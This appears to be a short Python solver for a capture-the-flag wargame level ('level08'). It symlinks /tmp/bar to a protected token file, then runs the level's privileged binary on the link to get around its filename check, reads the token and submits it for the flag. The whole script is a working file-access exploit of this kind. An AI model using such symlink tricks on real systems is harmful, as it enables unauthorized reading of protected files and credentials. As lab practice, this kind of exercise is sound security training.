from solver.utils import getflag

def solve(connection):
	connection.exec("ln -s /home/user/level08/token /tmp/bar")
	token = connection.exec("./level08 /tmp/bar")
	return token, getflag('08', token)